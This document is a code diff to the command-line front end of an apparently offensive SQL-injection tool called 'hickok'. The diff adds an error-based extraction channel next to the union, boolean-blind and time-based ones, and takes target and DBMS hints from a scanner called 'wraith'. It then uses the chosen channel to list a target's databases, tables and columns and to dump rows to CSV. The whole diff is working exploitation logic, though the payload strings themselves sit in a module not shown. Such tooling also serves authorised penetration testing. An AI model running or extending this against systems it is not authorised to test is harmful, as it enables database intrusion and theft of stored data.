@@ -207,15 +207,26 @@ _SQL_HELP = """  walk the database:
 """
 
 
+# wraith names Postgres "postgresql"; hickok's profiles call it "postgres". Other
+# engine names pass straight through; "oracle"/"" stay as-is (unsupported -> ignored).
+_WRAITH_DBMS = {"postgresql": "postgres"}
+
+
 def _sqli_target(items):
-    """Pull (url, param) from a wraith SQL-injection finding, if any."""
+    """Pull (url, param, technique, dbms) from a wraith SQL-injection finding, if any.
+
+    `technique`/`dbms` come from wraith >= 0.9.3 and steer which oracle hickok runs
+    first; an older wraith has neither, so they come back '' and the caller falls back
+    to trying everything (backward-compatible)."""
     for f in items:
         title = (f.get("title") or "")
         if "sql injection" in title.lower():
             m = re.search(r"in '([^']+)'", title)
             if m and f.get("target"):
-                return f["target"], m.group(1)
-    return None, None
+                tech = (f.get("technique") or "").strip().lower()
+                dbms = (f.get("dbms") or "").strip().lower()
+                return f["target"], m.group(1), tech, _WRAITH_DBMS.get(dbms, dbms)
+    return None, None, "", ""
 
 
 def cmd_sql(args) -> None:
@@ -245,13 +256,20 @@ def cmd_sql(args) -> None:
         return
 
     url, param, value = args.url, args.param, args.value
+    hint_tech = ""                               # wraith handoff: which oracle to try first
+    hint_dbms = _WRAITH_DBMS.get(args.dbms, args.dbms) if args.dbms else None
     if not url:                                  # fall back to wraith's latest run
         path = findings.latest()
         items = findings.load(path) if path else []
-        t, p = _sqli_target(items)
+        t, p, ht, hd = _sqli_target(items)
         if t:
             url, param = t, (param or p)
-            c.info(f"target from wraith: {p} @ {t}")
+            hint_tech = ht
+            hint_dbms = hint_dbms or (hd or None)
+            note = f"target from wraith: {p} @ {t}"
+            if ht:
+                note += f"  ·  technique={ht}" + (f", dbms={hd}" if hd else "")
+            c.info(note)
     if not url:
         c.bad("need a target — `hickok sql -u 'http://host/page?id=1' [-p id]`")
         raise SystemExit(2)
@@ -292,42 +310,63 @@ def cmd_sql(args) -> None:
     p = urlsplit(url)
     c.info(f"injecting '{param}' at {p.scheme}://{p.netloc}{p.path}")
 
-    # Pick a technique: union (whole values per request — fast) when output is
-    # reflected, else boolean-blind (a char at a time), else time-based (a
-    # delayed request per bit — works when nothing leaks at all).
-    oracle, union = None, None
-    if args.technique != "time":
+    # Pick a read channel, fastest-first, honouring --technique and the wraith hint.
+    # error-based goes first when asked for or when wraith flagged the point as such
+    # (the whole reason to read the handoff); else boolean (+ UNION when output
+    # reflects); else error-based as an auto fallback; else time-based (the blind).
+    want = args.technique
+    oracle, union, dbms = None, None, None
+
+    def _try_error():
+        with c.working("calibrating error-based", lambda: net.count):
+            return sqli.error_calibrate(net, url, param, value, dbms=hint_dbms, console=c)
+
+    if want == "error" or (want == "auto" and hint_tech == "error-based"):
+        c.info("calibrating error-based oracle…")
+        oracle = _try_error()
+        if oracle is None and want == "error":
+            c.bad("no error-based channel here — the DB error doesn't leak a sub-select")
+            raise SystemExit(1)
+
+    if oracle is None and want in ("auto", "union", "blind"):
         c.info("calibrating boolean-blind oracle…")
         with c.working("calibrating the oracle", lambda: net.count):
             oracle = sqli.calibrate(net, url, param, value, console=c)
+        if oracle is not None:
+            c.good(f"injectable — {oracle.context} context")
+            with c.working("fingerprinting the DBMS", lambda: net.count):
+                dbms = sqli.fingerprint(oracle)
+            if want in ("auto", "union"):
+                with c.working("probing for a UNION", lambda: net.count):
+                    setup = sqli.union_setup(net, oracle, dbms)
+                if setup:
+                    union = (dbms, *setup)
+                    c.good(f"union-based — {setup[0]} columns, output reflected (fast)")
+                elif want == "union":
+                    c.bad("no usable UNION here (no reflected column) — try --technique blind")
+                    raise SystemExit(1)
+            if union is None:
+                c.info("boolean-blind extraction (a request per bit — slower)")
 
-    if oracle is not None:
-        c.good(f"injectable — {oracle.context} context")
-        with c.working("fingerprinting the DBMS", lambda: net.count):
-            dbms = sqli.fingerprint(oracle)
-        if args.technique in ("auto", "union"):
-            with c.working("probing for a UNION", lambda: net.count):
-                setup = sqli.union_setup(net, oracle, dbms)
-            if setup:
-                union = (dbms, *setup)
-                c.good(f"union-based — {setup[0]} columns, output reflected (fast)")
-            elif args.technique == "union":
-                c.bad("no usable UNION here (no reflected column) — try --technique blind")
-                raise SystemExit(1)
-        if union is None:
-            c.info("boolean-blind extraction (a request per bit — slower)")
-    elif args.technique in ("auto", "time"):
-        c.info("no boolean differential — calibrating time-based oracle…")
+    if oracle is None and want == "auto" and hint_tech != "error-based":
+        c.info("no boolean differential — trying the error channel…")
+        oracle = _try_error()
+
+    if oracle is None and want in ("auto", "time"):
+        c.info("calibrating time-based oracle…")
         with c.working("calibrating time-based", lambda: net.count):
             oracle = sqli.time_calibrate(net, url, param, value, console=c)
-        if oracle is None:
-            c.bad("no injection found here (boolean, union, or time)")
-            raise SystemExit(1)
-        dbms = oracle.dbms
-        c.good(f"time-based — {oracle.n}s per true bit (slow but works on the blind)")
-    else:
-        c.bad("no boolean-blind injection here — try another parameter or value")
+        if oracle is not None:
+            dbms = oracle.dbms
+            c.good(f"time-based — {oracle.n}s per true bit (slow but works on the blind)")
+
+    if oracle is None:
+        c.bad("no injection found here (boolean, union, error, or time)")
         raise SystemExit(1)
+
+    if isinstance(oracle, sqli.ErrorOracle):
+        dbms = oracle.dbms
+        c.good(f"error-based — reading through the DB error message ({dbms})")
 
     prof = sqli._PROFILES.get(dbms, sqli._PROFILES["sqlite"])
     c.good(f"DBMS: {dbms}")
@@ -364,18 +403,24 @@ def cmd_sql(args) -> None:
 
 # Technique-agnostic walkers: use UNION when available, else boolean-blind.
 def _walk_banner(oracle, prof, union):
+    if isinstance(oracle, sqli.ErrorOracle):
+        return oracle.read(prof["version"])
     if union:
         return sqli.union_value(oracle.http, oracle, *union, sqli._PROFILES[union[0]]["version"])
     return sqli.extract_str(oracle, prof, prof["version"])
 
 
 def _walk_scalar(oracle, prof, union, expr):
+    if isinstance(oracle, sqli.ErrorOracle):
+        return oracle.read(expr)
     if union:
         return sqli.union_value(oracle.http, oracle, *union, expr)
     return sqli.extract_str(oracle, prof, expr)
 
 
 def _databases(oracle, prof, union):
+    if isinstance(oracle, sqli.ErrorOracle):
+        return sqli.error_databases(oracle)
     if union:
         return sqli.union_databases(oracle.http, oracle, *union)
     return sqli.databases(oracle, prof)
@@ -390,8 +435,8 @@ def _overview(c, oracle, prof, union) -> None:
         cur = ""
     dbs = []
     if union:                       # cheap (one request) — only auto-list when reflected
-        try:
-            dbs = [d for d in _databases(oracle, prof, union) if d]
+        try:                        # (error-based can echo a catalog error as "data", so
+            dbs = [d for d in _databases(oracle, prof, union) if d]   # leave it to `databases`)
         except Exception:
             dbs = []
     if dbs:
@@ -403,6 +448,8 @@ def _overview(c, oracle, prof, union) -> None:
 
 
 def _walk_tables(oracle, prof, union):
+    if isinstance(oracle, sqli.ErrorOracle):
+        return sqli.error_tables(oracle)
     if union:
         return sqli.union_tables(oracle.http, oracle, *union)
     return sqli.tables(oracle, prof)
@@ -412,8 +459,8 @@ def _tables(c, oracle, prof, union):
     """Tables via the catalog; if that's blocked/empty on a blind walk, fall back
     to guessing common names (no information_schema needed)."""
     tbls = list(_walk_tables(oracle, prof, union))
-    if tbls:
-        return tbls
+    if tbls or isinstance(oracle, sqli.ErrorOracle):
+        return tbls          # the error channel has no boolean ask() for by-name guessing
     blocked = getattr(oracle, "blocked", 0)
     if blocked:
         c.warn(f"the catalog (information_schema) looks filtered — {blocked} anomalous "
@@ -436,6 +483,8 @@ def _tables(c, oracle, prof, union):
 
 
 def _walk_columns(oracle, prof, union, table):
+    if isinstance(oracle, sqli.ErrorOracle):
+        return sqli.error_columns(oracle, table)
     if union:
         return sqli.union_columns(oracle.http, oracle, *union, table)
     return sqli.columns(oracle, prof, table)
@@ -443,7 +492,7 @@ def _walk_columns(oracle, prof, union, table):
 
 def _columns(c, oracle, prof, union, table):
     cols = list(_walk_columns(oracle, prof, union, table))
-    if cols:
+    if cols or isinstance(oracle, sqli.ErrorOracle):
         return cols
     if getattr(oracle, "blocked", 0):
         c.warn(f"columns of {table} via information_schema look filtered — guessing common names")
@@ -456,7 +505,9 @@ def _columns(c, oracle, prof, union, table):
 def _walk_dump(oracle, prof, union, table, console=None):
     cols = (_columns(console, oracle, prof, union, table) if console
             else list(_walk_columns(oracle, prof, union, table)))   # full list — reused per row
-    if union:
+    if isinstance(oracle, sqli.ErrorOracle):
+        rows = sqli.error_dump(oracle, table, cols)
+    elif union:
         rows = sqli.union_dump(oracle.http, oracle, *union, table, cols)
     else:
         rows = sqli.dump(oracle, prof, table, cols)          # a generator (lazy rows)
@@ -475,7 +526,9 @@ def _tables_in(c, oracle, prof, union, db):
     rich common-name fallback applies). A named database uses the scoped catalog."""
     if db is None:
         return _tables(c, oracle, prof, union)
-    if union:
+    if isinstance(oracle, sqli.ErrorOracle):
+        tbls = [t for t in sqli.error_tables(oracle, db=db) if t]
+    elif union:
         tbls = [t for t in sqli.union_tables(oracle.http, oracle, *union, db=db) if t]
     else:
         tbls = [t for t in sqli.tables(oracle, prof) if t]      # prof already scoped to db
@@ -487,6 +540,8 @@ def _tables_in(c, oracle, prof, union, db):
 def _columns_in(c, oracle, prof, union, table, db):
     if db is None:
         return _columns(c, oracle, prof, union, table)
+    if isinstance(oracle, sqli.ErrorOracle):
+        return [x for x in sqli.error_columns(oracle, table, db=db) if x]
     if union:
         return [x for x in sqli.union_columns(oracle.http, oracle, *union, table, db=db) if x]
     return [x for x in sqli.columns(oracle, prof, table) if x]   # prof already scoped
@@ -497,7 +552,9 @@ def _do_dump(c, oracle, prof, union, table, out_dir, db=None, save_label=None) -
     saves whatever was pulled even if the walk is interrupted. Returns the count.
     `db` scopes the read to another database; `save_label` namespaces the CSV."""
     cols = _columns_in(c, oracle, prof, union, table, db)
-    if union:
+    if isinstance(oracle, sqli.ErrorOracle):
+        rowgen = sqli.error_dump(oracle, table, cols, db=db)
+    elif union:
         rowgen = sqli.union_dump(oracle.http, oracle, *union, table, cols, db=db)
     else:
         rowgen = sqli.dump(oracle, prof, table, cols)           # prof already scoped
@@ -719,8 +776,10 @@ def build_parser() -> argparse.ArgumentParser:
     sq.add_argument("-u", "--url", help="target URL (default: wraith's latest SQLi finding)")
     sq.add_argument("-p", "--param", help="injectable parameter (inferred if the URL has just one)")
     sq.add_argument("--value", metavar="V", default="1", help="a normal value for the parameter (default: 1)")
-    sq.add_argument("--technique", choices=["auto", "union", "blind", "time"], default="auto",
-                    help="auto (union>blind>time) · union · blind · time")
+    sq.add_argument("--technique", choices=["auto", "union", "blind", "time", "error"], default="auto",
+                    help="auto (union>blind>error>time) · union · blind · time · error")
+    sq.add_argument("--dbms", choices=["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+                    help="hint the DBMS for error-based payloads (else from the handoff / detected)")
     sq.add_argument("-v", "--verbose", nargs="?", const=1, type=int, default=0, metavar="LEVEL",
                     help="-v 2 prints every injected payload")
     sq.add_argument("--fresh", action="store_true",
